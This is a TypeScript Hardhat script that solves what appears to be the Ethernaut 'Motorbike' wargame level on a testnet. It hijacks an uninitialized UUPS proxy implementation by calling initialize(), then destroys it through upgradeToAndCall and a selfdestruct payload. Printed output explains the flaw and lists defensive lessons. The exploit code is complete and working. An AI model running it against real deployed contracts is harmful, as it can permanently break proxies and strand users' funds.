import { ethers } from "hardhat";

/**
 * Execute the Motorbike exploit to selfdestruct the Engine implementation
 * 
 * Usage:
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourMotorbikeAddress npx hardhat run scripts/level-25-motorbike/execute-motorbike-exploit.ts --network sepolia
 * 
 * Or execute directly without exploit contract:
 * TARGET_ADDRESS=0xYourMotorbikeAddress npx hardhat run scripts/level-25-motorbike/execute-motorbike-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Motorbike exploit...\n");
  
  // Get the target address from environment
  const targetAddress = process.env.TARGET_ADDRESS;
  const exploitAddress = process.env.EXPLOIT_ADDRESS;
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}\n`);
  
  try {
    // Connect to the Motorbike proxy
    const motorbike = await ethers.getContractAt("Motorbike", targetAddress);
    
    // Read the implementation address from storage
    const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
    const implFromStorage = await ethers.provider.getStorage(targetAddress, IMPLEMENTATION_SLOT);
    const engineAddress = "0x" + implFromStorage.slice(-40);
    
    console.log("=== Initial State ===");
    console.log(`Motorbike Proxy: ${targetAddress}`);
    console.log(`Engine Implementation: ${engineAddress}`);
    
    // Connect to the Engine implementation directly
    const engine = await ethers.getContractAt("Engine", engineAddress);
    
    // Check if engine still has code
    const initialCode = await ethers.provider.getCode(engineAddress);
    console.log(`Engine code size: ${initialCode.length} bytes`);
    
    if (initialCode === "0x" || initialCode === "0x0") {
      console.log("\nâš ï¸  Engine is already destroyed!");
      return;
    }
    
    // Check if engine is initialized
    try {
      const upgrader = await engine.upgrader();
      const horsePower = await engine.horsePower();
      console.log(`Engine upgrader: ${upgrader}`);
      console.log(`Engine horsePower: ${horsePower}`);
      
      if (upgrader !== ethers.ZeroAddress && upgrader !== signer.address) {
        console.log("\nâš ï¸  Warning: Engine is already initialized by someone else!");
        console.log("Cannot proceed with exploit.");
        return;
      }
      
      if (upgrader === signer.address) {
        console.log("\nâœ“ We are already the upgrader! Proceeding to destroy...");
      }
    } catch (e) {
      console.log("Could not read engine state (might be uninitialized)");
    }
    
    // Explain the vulnerability
    console.log("\n=== Vulnerability Explanation ===");
    console.log("UUPS (Universal Upgradeable Proxy Standard) Vulnerability:");
    console.log("");
    console.log("The Issue:");
    console.log("  1. Motorbike proxy calls initialize() via delegatecall in constructor");
    console.log("  2. This initializes the PROXY's storage, not the implementation's");
    console.log("  3. The Engine implementation itself is NEVER initialized");
    console.log("  4. Anyone can call initialize() directly on the implementation");
    console.log("  5. Once initialized, they control the implementation's upgrade logic");
    console.log("");
    console.log("Attack Steps:");
    console.log("  1. Call initialize() directly on Engine implementation");
    console.log("  2. Deploy a contract with selfdestruct");
    console.log("  3. Call upgradeToAndCall with selfdestruct payload");
    console.log("  4. Engine is destroyed, Motorbike becomes unusable");
    
    // Execute the exploit
    console.log("\n=== Executing Exploit ===\n");
    
    // Step 1: Initialize the Engine implementation
    console.log("âœ“ Step 1: Initializing Engine implementation directly...");
    const initTx = await engine.initialize();
    await initTx.wait();
    console.log("  âœ“ Success! We are now the upgrader of the implementation");
    
    // Verify we're the upgrader
    const newUpgrader = await engine.upgrader();
    if (newUpgrader !== signer.address) {
      throw new Error(`Failed to become upgrader! Upgrader is: ${newUpgrader}`);
    }
    console.log(`  âœ“ Confirmed: upgrader = ${newUpgrader}`);
    
    // Step 2: Deploy SelfDestructor contract
    console.log("\nâœ“ Step 2: Deploying SelfDestructor contract...");
    const SelfDestructor = await ethers.getContractFactory("SelfDestructor");
    const selfDestructor = await SelfDestructor.deploy();
    await selfDestructor.waitForDeployment();
    const destructorAddress = await selfDestructor.getAddress();
    console.log(`  âœ“ SelfDestructor deployed at: ${destructorAddress}`);
    
    // Step 3: Call upgradeToAndCall with selfdestruct payload
    console.log("\nâœ“ Step 3: Calling upgradeToAndCall to destroy Engine...");
    const destroyData = selfDestructor.interface.encodeFunctionData("destroy");
    const upgradeTx = await engine.upgradeToAndCall(destructorAddress, destroyData);
    console.log(`  Transaction hash: ${upgradeTx.hash}`);
    console.log("  Waiting for confirmation...");
    
    await upgradeTx.wait();
    console.log("  âœ“ Transaction confirmed!");
    
    // Verify the engine is destroyed
    console.log("\n=== Verification ===");
    const finalCode = await ethers.provider.getCode(engineAddress);
    console.log(`Engine code size after exploit: ${finalCode.length} bytes`);
    
    if (finalCode === "0x" || finalCode === "0x0") {
      console.log("\nâœ… SUCCESS! Engine has been destroyed!");
      console.log("");
      console.log("ðŸ“‹ What happened:");
      console.log("  1. We initialized the uninitialized Engine implementation");
      console.log("  2. This made us the upgrader (in implementation's storage)");
      console.log("  3. We deployed a SelfDestructor contract");
      console.log("  4. We called upgradeToAndCall with SelfDestructor + destroy()");
      console.log("  5. The Engine delegatecalled to SelfDestructor.destroy()");
      console.log("  6. selfdestruct executed in Engine's context â†’ Engine destroyed!");
      console.log("");
      console.log("Result:");
      console.log("  â€¢ Engine implementation code is GONE");
      console.log("  â€¢ Motorbike proxy still exists but points to nothing");
      console.log("  â€¢ All calls to Motorbike will fail");
      console.log("  â€¢ The motorbike is UNUSABLE! ðŸï¸ðŸ’¥");
      
      console.log("\nâš ï¸  Key Lessons:");
      console.log("  1. ALWAYS initialize implementation contracts");
      console.log("  2. Use initializer modifiers to prevent re-initialization");
      console.log("  3. In UUPS, upgrade logic lives in implementation (dangerous!)");
      console.log("  4. Consider using Transparent Proxy instead of UUPS");
      console.log("  5. Never leave implementation contracts publicly accessible");
      console.log("  6. OpenZeppelin's Initializable should be used correctly");
      
    } else {
      console.log("\nâŒ FAILED! Engine still has code.");
      console.log("Something went wrong with the exploit.");
    }
    
  } catch (error: any) {
    console.error("\nâŒ Error executing Motorbike exploit:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
